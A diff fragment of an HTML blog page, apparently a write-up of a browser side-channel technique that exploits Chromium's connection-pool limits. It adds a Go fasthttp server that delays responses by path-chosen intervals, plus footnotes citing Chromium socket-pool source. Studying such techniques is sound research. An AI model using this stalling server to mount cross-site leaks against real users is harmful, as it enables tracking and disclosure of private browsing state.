+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fasthttp</span>.<span style="color:#a6e22e">ListenAndServe</span>(<span style="color:#e6db74">&#34;:80&#34;</span>, <span style="color:#a6e22e">requestHandler</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>		panic(<span style="color:#e6db74">&#34;Error in ListenAndServe: &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">requestHandler</span>(<span style="color:#a6e22e">ctx</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">fasthttp</span>.<span style="color:#a6e22e">RequestCtx</span>) {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">workerSemaphore</span> <span style="color:#f92672">&lt;-</span> <span style="color:#66d9ef">struct</span>{}{}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> <span style="color:#66d9ef">func</span>() { <span style="color:#f92672">&lt;-</span><span style="color:#a6e22e">workerSemaphore</span> }()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">path</span> <span style="color:#f92672">:=</span> string(<span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">Path</span>())
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span> <span style="color:#a6e22e">path</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;/40sleep&#34;</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Sleep</span>(<span style="color:#ae81ff">40</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">SetStatusCode</span>(<span style="color:#a6e22e">fasthttp</span>.<span style="color:#a6e22e">StatusOK</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;/ssleep&#34;</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Sleep</span>(<span style="color:#ae81ff">250</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Millisecond</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">SetStatusCode</span>(<span style="color:#a6e22e">fasthttp</span>.<span style="color:#a6e22e">StatusOK</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">default</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> len(<span style="color:#a6e22e">path</span>) &gt; <span style="color:#ae81ff">1</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">trimmed</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strings</span>.<span style="color:#a6e22e">TrimPrefix</span>(<span style="color:#a6e22e">path</span>, <span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">seconds</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">Atoi</span>(<span style="color:#a6e22e">trimmed</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Sleep</span>(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Duration</span>(<span style="color:#a6e22e">seconds</span>) <span style="color:#f92672">*</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span>)
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">SetStatusCode</span>(<span style="color:#a6e22e">fasthttp</span>.<span style="color:#a6e22e">StatusOK</span>)
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#e6db74">&#34;Not Found&#34;</span>, <span style="color:#a6e22e">fasthttp</span>.<span style="color:#a6e22e">StatusNotFound</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="footnotes" role="doc-endnotes">
 <hr>
 <ol>
 <li id="fn:1">
@@ -1000,6 +1151,18 @@ However, the following technique involves counting the number of requests made. 
 </li>
 <li id="fn:2">
 <p><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face/src#description">https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face/src#description</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3">
+<p><a href="https://source.chromium.org/chromium/chromium/src/+/main:net/socket/transport_client_socket_pool.cc;l=217;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd?q=FindTopStalledGroup&amp;ss=chromium%2Fchromium%2Fsrc">https://source.chromium.org/chromium/chromium/src/+/main:net/socket/transport_client_socket_pool.cc;l=217;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd?q=FindTopStalledGroup&amp;ss=chromium%2Fchromium%2Fsrc</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:4">
+<p><a href="https://source.chromium.org/chromium/chromium/src/+/main:net/socket/transport_client_socket_pool.h;l=775;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd">https://source.chromium.org/chromium/chromium/src/+/main:net/socket/transport_client_socket_pool.h;l=775;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:5">
+<p><a href="https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool.h;l=99;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd">https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool.h;l=99;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:6">
+<p><a href="https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool.h;l=139;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd">https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool.h;l=139;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
 </li>
 </ol>
 </div>
